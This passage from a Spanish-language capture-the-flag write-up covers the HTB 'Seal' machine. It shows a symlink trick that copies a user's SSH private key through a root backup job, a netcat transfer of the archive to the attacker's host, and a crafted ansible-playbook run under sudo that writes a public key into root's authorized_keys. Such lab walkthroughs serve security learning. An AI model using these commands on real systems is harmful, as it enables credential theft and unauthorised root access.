  Toma los objetos de la ruta `/opt/backups/files/` y los comprime en un solo `.gz` (**gzip**) alojado en `/opt/backups/archives/backup-<fecha>-<hora>.gz`.

* 3 - Borrado de archivos.

  Sencillamente borra la carpeta `/opt/backups/files/` y todo su contenido.

...

En el paso `1` hay una instrucci√≥n muy juguetona, ya que esta copiando el contenido de toooooodo el directorio `/dashboard` sobre el directorio `/opt/backups/files` yyyyy tambi√©n copia los links de los objetos, con lo que podr√≠amos crear un **link simb√≥lico** a cualquier objeto del sistema, entonces leer√≠a nuestro archivo, peeero realmente el contenido ser√≠a el del objeto del sistema al que hace referencia :O 

Lo malo es que no sabemos si debamos interactuar con este objeto o si sea parte del **priv-esc** (o de ninguna parte :P), ya que no tenemos posibilidad de ejecutarlo...

Dando unas vueltas vemos esto al listar los procesos del sistema:

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ps fauxxx
...
root  ...  \_ /usr/sbin/CRON -f
root  ...     \_ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
root  ...        \_ sleep 30
...
```

Opaaa, el usuario `root` tiene una tarea automatizada, esta ejecuta como el usuario `luis` el binario `/usr/bin/ansible-playbook` sobre el recurso que vimos antes: `/opt/backups/playbook/run.yml`. La tarea es lanzada cada **30 segundos** (`sleep 30`).

Pues ahora si toma sentido el backup y la idea de crear un link simb√≥lico, profundicemos...

...

La idea del link simb√≥lico es f√°cil, peeeeeero antes de emocionarnos, veamos si tenemos permisos de escritura sobre alg√∫n objeto de `/dashboard`, y si no, pos F:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_tomcatSH_lsLA_dashboard_writableUPLOADS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y s√≠, podemos escribir cositas en `/uploads`, pues juguemos con s√≠mbolos:

Primero generamos un archivo normalito:

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ touch hola.txt
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
total 8
drwxrwxrwx 2 root   root   4096 Aug 26 22:10 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
-rw-r----- 1 tomcat tomcat    0 Aug 26 22:10 hola.txt
```

Sabemos que el que esta ejecutando el binario y el archivo `run.yml` es `luis`, pues intentemos leer su `id_rsa` (que no sabemos si exista (existe el directorio `.ssh`) peeeero por probar):

> Leemos la `id_rsa` (llave privada) para en caso de que exista, autenticarnos con ella al sistema usando **SSH** sin necesidad de una contrase√±a.

üîë ***[M√°s info de llaves `SSH`](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2)***.

Entonces, le indicamos al sistema que tome `hola.txt` como un **link simb√≥lico** hacia el archivo `/home/luis/.ssh/id_rsa`. 

Lo que har√° el sistema al leer el archivo `hola.txt` ser√° decir, "ahh, realmente este objeto esta tomando el contenido de `.../id_rsa`", as√≠ que en el "backup" que hace la tarea, nos estar√≠amos copiando la llave privada del usuario `luis`.

Hacemos el enlace:

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -sf /home/luis/.ssh/id_rsa hola.txt 
```

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
total 8
drwxrwxrwx 2 root   root   4096 Aug 26 22:09 .
drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
lrwxrwxrwx 1 tomcat tomcat   22 Aug 26 22:09 hola.txt -> /home/luis/.ssh/id_rsa
```

Listones, ah√≠ se ve la referencia de la que hablamos, al hacer `cat hola.txt` estar√≠amos haciendo `cat /home/luis/.ssh/id_rsa`:

```bash
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cat hola.txt 
cat: hola.txt: Permission denied
```

Perfesasdlfkjto. Ahooooora, solo es cuesti√≥n de esperar y validar el directorio `/opt/archives` en b√∫squeda del nuevo comprimido:

‚è∞

```bash
tomcat@seal:/opt/backups/archives$ ls -la
total 1196
drwxrwxr-x 2 luis luis   4096 Aug 26 22:36 .
drwxr-xr-x 4 luis luis   4096 Aug 26 22:36 ..
-rw-rw-r-- 1 luis luis 608920 Aug 26 22:36 backup-2021-08-26-22:36:33.gz
```

Ya se cre√≥ el comprimido, mov√°moslo a nuestro sistema y lo descomprimimos...

Lo movemos:

```bash
‚ù± nc -lvp 4435 > backup.gz
tomcat@seal:/opt/backups/archives$ nc -w 5 10.10.14.93 4435 < backup-2021-08-26-22\:36\:33.gz
```

Lo descomprimimos:

```bash
‚ù± gzip -d backup.gz
‚ù± ls
backup
```

Leyendo y leyendo encontramos estoooooooooooooo:

```bash
‚ù± strings backup
...
28 mtime=1620367850.0521452
dashboard/uploads/hola.txt
0000600
...
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_stringsBACKUP_idRSA_luis.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tenemos la llave privada de `luis`, la tomamos, la guardamos en un archivo, le damos los permisos necesarios y con ayuda de `SSH` hacemos:

```bash
‚ù± chmod 700 luis.id_rsa
‚ù± ssh luis@10.10.10.250 -i luis.id_rsa
```

Yyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_ssh_luisSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Tamos dentro del sistema como el usuario `luis`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358google_gif_DTasGOKU_yeaaah.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Revisando los permisos que tenemos contra otros usuarios vemos:

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Podemos ejecutar el binario `/usr/bin/ansible-playbook` como cualqueir usuario del sistema üßê busquemos de que se trata y para que sirve...

`Ansible` es una plataforma para administrar ordenadores, que junto a los **playbooks** automatizan las tareas llevadas a cabo sobre un host.

‚úîÔ∏è ***`Ansible playbooks` are <u>lists of tasks that automatically execute against hosts</u>. Each module within an Ansible playbook <u>performs a specific task</u>. Each module contains metadata that determines when and where a task is executed, as well as which user executes it.*** [redhat](https://www.redhat.com/en/topics/automation/what-is-an-ansible-playbook)

* [Ansible Tutorial for Beginners: Playbook, Commands & Example](https://www.guru99.com/ansible-tutorial.html).
* [Ansible - Playbooks](https://www.tutorialspoint.com/ansible/ansible_playbooks.htm).
* [What is difference between running the commands ansible and ansible-playbook](https://stackoverflow.com/questions/64723019/what-is-difference-between-running-the-commands-ansible-and-ansible-playbook).

Leyendo vemos que los **playbooks** [estan escritos](https://docs.ansible.com/ansible/latest/reference_appendices/YAMLSyntax.html) en formato [YAML](https://geekflare.com/es/yaml-introduction/) (`.yml`), esto para hacerlos de facil lectura y sencillos de usar.

Si recordamos el objeto `run.yml` es un **playbook**, ya que dentro tiene varias tareas a ejecutar sobre el sistema, por lo que podriamos ejecutarlo como el usuario `root`:

```bash
luis@seal:/opt/backups/playbook$ sudo /usr/bin/ansible-playbook run.yml
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_luisSH_ansiblePlaybook_runYML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y el backup se crearia como el usuario `root`:

```bash
luis@seal:/opt/backups/playbook$ ls -la /opt/backups/archives/
total 2376
drwxrwxr-x 2 luis luis   4096 Aug 27 04:51 .
drwxr-xr-x 4 luis luis   4096 Aug 27 04:51 ..
-rw-r--r-- 1 root root 605952 Aug 27 04:51 backup-2021-08-27-04:51:58.gz
```

Con esto en mente, podemos pensar en dos vectores de ataque:

1. Hacer el mismo paso que hicimos con `tomcat` para obtener la `id_rsa` de `luis`, solo que ahora seria para obtener la del usuario `root`.
2. **Crear un <u>playbook</u> con contenido jugoso que sea ejecutado en el sistema, veamos esta opci√≥n**...

---

## Generamos <u>playbook</u> juguet√≥n [üìå](#malicious-playbook) {#malicious-playbook}

Podemos quedarnos con la base del objeto `run.yml` para empezar a generar nuestro archivo `YAML`.

Buscando ejemplos en internet que ejecuten instrucciones en el sistema, llegamos a este objeto:

* [https://github.com/lmacken/ansible-hacker-playbook/blob/master/playbook.yml](https://github.com/lmacken/ansible-hacker-playbook/blob/master/playbook.yml).

En una de las tareas usa la etiqueta `action` para ejecutar comandos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358google_github_playbookYML_actionTAG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pues muy sencillo, como prueba inicial digamosle a la tarea que nos ejecute el comando `id` y su resultado lo guarde en un archivo, si todo va bien, confirmamos que nuestro **playbook** esta funcionando y que tenemos **RCE** como el usuario `root` sobre el sistema.

Nuestro objeto `run.yml` nos quedaria as√≠:

```bash
luis@seal:/tmp/tessst$ cat run.yml 
```

```yml
- hosts: localhost
  tasks:
  - name: Rompiendo cositas rompedoras
    action: shell id > /tmp/tessst/id.txt
```

Ejecutamos el binario contra el archivo:

```bash
luis@seal:/tmp/tessst$ sudo /usr/bin/ansible-playbook run.yml 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_luisSH_ansiblePlaybook_MALICIOUSrunYML_idTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lii ii i i i isssto, nuestra instruccion se ejecuta correctamente y vemos el objeto `id.txt` con el `id` del usuario **root**. Por lo tanto ya podriamos ejecutar lo que quisieramoooooooooooos.

...

Consigamos una Shell como el usuario `root`.

Hay varias maneras, pero esta vez lo haremos jugando con las llaves **SSH** del usuario `root`, primero validemos si existe el directorio `.ssh` y si tiene contenido:

```yml
- hosts: localhost
  tasks:
  - name: Rompiendo cositas rompedoras
    action: shell find /root > /tmp/tessst/root_dir
```

Ejecutamos el binario contra el archivo y como resultado en el archivo `root_dir` vemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_luisSH_catRootDIR_FOLDERsshNOTfoundONroot.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

No existe, as√≠ que tendremos que crearlo, no es problema (:

La idea del "ataque" es agregar nuestra llave p√∫blica al archivo `/root/.ssh/authorized_keys` para que cuando intentemos conectarnos por **SSH** como el usuario `root`, el sistema interprete que nosotros (los due√±os de una de las llaves p√∫blicas autorizadas para ingresar) tenemos acceso a la m√°quina sin proporcionar contrase√±a.

El "¬øc√≥mo?" el sistema permite la autenticaci√≥n simplemente usando llaves no lo profundizar√©, ya que nos vamos del writeup, pero les dejo algunos recursos que lo explican:

* [**Authorized_keys** file in SSH](https://www.ssh.com/academy/ssh/authorized-keys-file).
* [Acceso a m√°quinas **usando la SSH sin contrase√±a**](https://www.uv.es/~sto/articulos/BEI-2003-01/ssh_np.html).

---

> Basicamente valida tu llave privada (la que tienes en el sistema) y si criptograficamente hace match con la llave publica alojada en las "llaves permitidas", pues sencillamente te otorga el acceso.

Entonces, primero debemos generar nuestro par de llaves, obtendremos la privada y la publica, el comando b√°sico es:

```bash
‚ù± ssh-keygen
```

Y ya tendr√≠amos:

```bash
‚ù± ls /home/jntx/.ssh/
authorized_keys  id_rsa  id_rsa.pub  known_hosts
```

Nos quedamos con el archivo `id_rsa.pub`, lo abrimos (o lo que sea que hagas :P) y copiamos su contenido en la clipboard.

Lo siguiente ser√° darle formato a nuestro objeto `.yml` creando la carpeta `.ssh` y agregando la llave p√∫blica al archivo `authorized_keys` (adem√°s de validar que todo se cre√≥ correctamente):

```yml
- hosts: localhost
  tasks:
  - name: Carpeta SSH usuario root
    action: shell mkdir /root/.ssh
  - name: Llave publica archivo authorized_keys
    action: shell echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuTFbcJf0gTchUTWp+X/3xyP1JO8gq9nK2JUgf34qudrTWO8b963u0oZLxAFM8Opx8fR9jOXO0w2IE/G+9Az42XLOisqqQlSurPsIjW39I50RnP0vbcWC3GzY8gZAkrtT8yHhqsfGVKt4G6BrClzhLf5OVAywT9fX4TmS8oaLV88NyrPVbPe40NvE7mBbjW69JOr1jKs+tW0mxwyMtT5PpP5gPi16nkeyQ+sIWL3pZ1dW8DqMlUx6j4hftUYR8C2Ngr84hNpDgR4zaLM7H3l0w1nb8PvVbE7+siAP4NhaKui9k7mRWxDnqrWEbPuL/oCCH1qgzYGwJzUkKnV6buyh0plVZNljfEl0tgR/Cj4VDBz9zv0FQIB+jPY73a4f96rBETEVluJWpLxcEeXY80q/WF08kOVzbf3KO8sI2EZBqoriiBannycjK2gKH2re/+UYsJiB/tufEBLQB7sSf4xeRsEdqSv/qf9rrB4lAsporP/5otsUpvyh32dibwnNQR3E= root@ayya" > /root/.ssh/authorized_keys
  - name: Check agregazhion y creasion
    action: shell find /root > /tmp/tessst/dir_root
```

Perfecto, nuestras tres tareas bien lindas, ejecutemos a ver queeee:

```bash
luis@seal:/tmp/tessst$ sudo /usr/bin/ansible-playbook run.yml 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_luisSH_ansiblePlaybook_MALICIOUSrunYML_addingPublicRSA.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, un vistazo r√°pido a nuestro archivo `dir_root`:

```bash
luis@seal:/tmp/tessst$ cat dir_root 
...
/root/.ssh
/root/.ssh/authorized_keys
```

Carpeta creada y archivo creado üôå

Y ahora como prueba final debemos conectarnos contra el usuario `root` utilizando **SSH**, no nos deber√≠a pedir contrase√±a y tendr√≠amos una Shell:

```bash
‚ù± ssh root@10.10.10.250
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358bash_rootSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PEEEEEEEEEEEEEERFECTOOOOOOOOOOOOOO, obtenemos nuestra **Shell** como `root` (:

Ya podr√≠amos ver las flags...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/seal/358flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y tamoooos.

...

Bastaaaante interesante el camino de **tomcat** a **root**. Muuy divertido y original (o pues yo no lo hab√≠a visto).

Hasta ac√° nos ha tra√≠do este writeup, nos leeremos despu√©s, peeeero seguiremos rompiendo de todooooooooooooooo!